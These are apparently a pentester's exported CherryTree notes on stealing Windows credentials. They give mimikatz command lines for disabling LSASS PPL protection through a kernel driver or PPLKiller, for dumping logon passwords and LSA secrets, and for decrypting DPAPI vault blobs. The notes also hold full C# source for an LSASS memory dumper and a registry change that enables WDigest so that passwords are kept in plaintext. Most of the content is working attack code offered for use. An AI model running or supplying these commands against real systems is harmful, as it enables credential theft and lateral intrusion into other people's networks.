<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>dump lsass creds / runassppl / DPAPI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>dump lsass creds / runassppl / DPAPI</h1><br/><p><h2>Exploit sedebug privilege</h2><ul><li>allow a user to read and write a process of other user</li><li>mimikatz: privilege::debug </li></ul></p><p></p><p><h2>DISABLE LSA  security(RunasPPL) </h2><ul><li><small>LSASS supports PPL protection, which can be enabled in the registry. This is done through the RunAsPPL DWORD value in HKLM\SYSTEM\CurrentControlSet\Control\Lsa with a value of 1.</small></li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#identify </span><br /><span style="color:#ff9d00;font-weight:700">Get-ItemProperty</span> <span style="color:#ff9d00;font-weight:700">-</span>Path HKLM<span style="color:#ff9d00;font-weight:700">:\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>Lsa <span style="color:#333333;font-weight:400">-Name</span> <span style="color:#3ad900;font-weight:400">&quot;RunAsPPL&quot;</span><br /><span style="color:#0088ff;font-weight:400"># disable ppl </span><br />cmd <span style="color:#ff9d00;font-weight:700">/</span>c <span style="color:#333333;font-weight:400">&#39;sc create mimidrv binPath= C:\Windows\Tasks\mimidrv.sys type= kernel start= demand&#39;</span><br />cmd <span style="color:#ff9d00;font-weight:700">/</span>c <span style="color:#333333;font-weight:400">&#39;sc start mimidrv&#39;</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;token::elevate&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;!+&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;!processprotect /process:lsass.exe /remove&quot;</span>  <span style="color:#3ad900;font-weight:400">&quot;sekurlsa::logonpasswords&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;lsadump::secrets&quot;</span>  <span style="color:#3ad900;font-weight:400">&quot;sekurlsa::dpapi&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># disable ppl : alternative </span><br />https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>RedCursorSecurityConsulting<span style="color:#ff9d00;font-weight:700">/</span>PPLKiller<br />PPLKiller.exe <span style="color:#ff9d00;font-weight:700">/</span>installDriver</pre></div></p><p><h2>Processing Credentials Offline: Memory Dump</h2><ul><li>Method 1: task manager: locate lsass.exe =&gt; Create dump file<ul><li>parse it with mimikatz<ul><li>sekurlsa::minidump lsass.dmp</li><li>sekurlsa::logonpasswords</li></ul></li></ul></li><li>Method 2 : Procdump (can be detected by AV)</li><li>Medthod 3 : own parser  â—‡Minidump.ps1</li></ul></p><p></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Diagnostics;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.IO;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> MiniDump<br />{<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">int</span> MiniDumpWithFullMemory = <span style="color:#ff0044;font-weight:400">2</span>;<br />        <span style="color:#ff9d00;font-weight:700">static</span> UInt32 PROCESS_ALL_ACCESS = <span style="color:#ff0044;font-weight:400">0x001F0FFF</span>;<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;Dbghelp.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#7f0044;font-weight:400">bool</span> MiniDumpWriteDump(IntPtr hProcess, <span style="color:#7f0044;font-weight:400">int</span> ProcessId, IntPtr hFile, <span style="color:#7f0044;font-weight:400">int</span> DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);<br /><br />        [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr OpenProcess(<span style="color:#7f0044;font-weight:400">uint</span> processAccess, <span style="color:#7f0044;font-weight:400">bool</span> bInheritHandle, <span style="color:#7f0044;font-weight:400">int</span> processId);<br /><br />        <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// Get the PID of lsass.exe</span><br />            Process[] lsass = Process.GetProcessesByName(<span style="color:#3ad900;font-weight:400">&quot;lsass&quot;</span>);<br />            <span style="color:#7f0044;font-weight:400">int</span> lsass_pid = lsass[<span style="color:#ff0044;font-weight:400">0</span>].Id;<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got lsass.exe PID: {lsass_pid}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get a handle on LSASS</span><br />            IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, <span style="color:#ff0044;font-weight:400">false</span>, lsass_pid);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got a handle on lsass.exe: {handle}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Dump LSASS process to file</span><br />            <span style="color:#7f0044;font-weight:400">string</span> filePath = <span style="color:#3ad900;font-weight:400">&quot;C:\\Windows\\tasks\\lsass.dmp&quot;</span>;<br />            FileStream dumpFile = <span style="color:#ff9d00;font-weight:700">new</span> FileStream(filePath, FileMode.Create);<br />            <span style="color:#7f0044;font-weight:400">bool</span> dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);<br />            <span style="color:#ff9d00;font-weight:700">if</span> (dumped)<br />            {<br />                Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Dumped LSASS memory to {filePath}.&quot;</span>);<br />            }<br />            <span style="color:#ff9d00;font-weight:700">else</span><br />            {<br />                Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Error dumping LSASS memory: {Marshal.GetLastWin32Error()}&quot;</span>);<br />            }<br />        }<br />    }<br />}</pre></div></p><p></p><p></p><p><h2>DPAPI</h2></p><p><ul><li><small>The Data Protection API (DPAPI) is a feature in Windows operating systems that provides a way to encrypt and decrypt sensitive data by using the user or machine credentials as a key. It is designed to help developers protect user data by providing a simple yet effective way to encrypt and decrypt data.</small></li></ul><small></small></p><p><small>DPAPI is commonly used by applications to protect user data, such as web browsers to store user passwords, email clients to store user credentials, and other applications that store sensitive information.</small><small></small></p><p><small>The way the Windows Credential Manager works is a bit confusing at first - if you read up on the subject, you&#39;ll find both the terms &quot;Vaults&quot; and &quot;Credentials&quot;. A &quot;vault&quot; essentially holds records of encrypted credentials and a reference to the encrypted blobs. Windows has two vaults: Web Credentials (for storing browser credentials) and Windows Credentials (for storing credentials saved by mstsc, etc). A &quot;credential&quot; is the actual encrypted credential blob.</small><small></small></p><p><small>The credentials are usually stored at C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials.</small></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># option 1: list vaults (mimikatz)</span><br />vaultcmd <span style="color:#ff9d00;font-weight:700">/</span>list<br />vaultcmd <span style="color:#ff9d00;font-weight:700">/</span>listcreds<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#3ad900;font-weight:400">&quot;&lt;VAULT&gt;&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>all<br /><br /><span style="color:#0088ff;font-weight:400"># option 2 :seatbelt </span><br /><span style="color:#0088ff;font-weight:400">### Credentials saved in the Windows Vault (i.e. logins from Internet Explorer and Edge).</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>Seatbelt.exe WindowsVault <br /><br /><span style="color:#0088ff;font-weight:400">### Windows credential DPAPI blobs</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>Seatbelt.exe WindowsCredentialFiles<br /><br /><span style="color:#0088ff;font-weight:400"># step 2: obtain the keys</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;token::elevate&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;sekurlsa::dpapi&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">##  This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must  impersonate the target user somehow first, then execute the command  using the `@` modifier.</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz dpapi<span style="color:#ff9d00;font-weight:700">::</span>masterkey <span style="color:#ff9d00;font-weight:700">/</span>rpc <span style="color:#ff9d00;font-weight:700">/in:</span>C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>&lt;USER&gt;<span style="color:#ff9d00;font-weight:700">\</span>AppData<span style="color:#ff9d00;font-weight:700">\</span>Roaming<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Protect<span style="color:#ff9d00;font-weight:700">\</span>&lt;FOLDER&gt;<span style="color:#ff9d00;font-weight:700">\</span>&lt;MASTER_KEY&gt; <br /><br /><span style="color:#0088ff;font-weight:400"># step 3 : decrypt the keys </span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;dpapi::cred /in:C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials\&lt;VAULT_FILENAME&gt; /masterkey:&lt;MASTERKEY&gt;&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;dpapi::cred /in: C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:0adc73bd-e86a-4850-8a0f-7815b91201aa&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><span style="color:#0088ff;font-weight:400"># decrypting the credentials inside scheduled tasks </span><br /><span style="color:#0088ff;font-weight:400">## 01. obtain the master key</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\&lt;FILE_NAME&gt;&quot;</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;token::elevate&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;!sekurlsa::dpapi&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## 02. dump the creds </span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;privilege::debug&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;token::elevate&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;!sekurlsa::dpapi&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;exit&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## 03. decrypt the creds </span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe dpapi<span style="color:#ff9d00;font-weight:700">::</span>cred <span style="color:#ff9d00;font-weight:700">/in:</span>C<span style="color:#ff9d00;font-weight:700">:\</span>Windows<span style="color:#ff9d00;font-weight:700">\</span>System32<span style="color:#ff9d00;font-weight:700">\</span>config<span style="color:#ff9d00;font-weight:700">\</span>system<br /><br /><span style="color:#0088ff;font-weight:400"># alternatives </span><br />sharpdpapi<br />https<span style="color:#ff9d00;font-weight:700">://</span>ppn.snovvcrash.rocks<span style="color:#ff9d00;font-weight:700">/</span>pentest<span style="color:#ff9d00;font-weight:700">/</span>infrastructure<span style="color:#ff9d00;font-weight:700">/</span>ad<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">credential-harvesting</span><span style="color:#ff9d00;font-weight:700">/</span>dpapi<br /></pre></div></p><p></p><p><h2>WDIGEST authentication</h2></p><p>When the WDigest Authentication protocol is enabled, plain text passwords are stored in the Local Security Authority Subsystem Service (LSASS) exposing them to the pentester.</p><p><div class="codebox"><pre>reg add HKLM<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>SecurityProviders<span style="color:#ff9d00;font-weight:700">\</span>WDigest <span style="color:#ff9d00;font-weight:700">/</span>v UseLogonCredential <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span><br />.<span style="color:#ff9d00;font-weight:700">\</span>mimikatz.exe <span style="color:#3ad900;font-weight:400">&quot;sekurlsa::wdigest&quot;</span></pre></div></p></div>
</body>
</html>
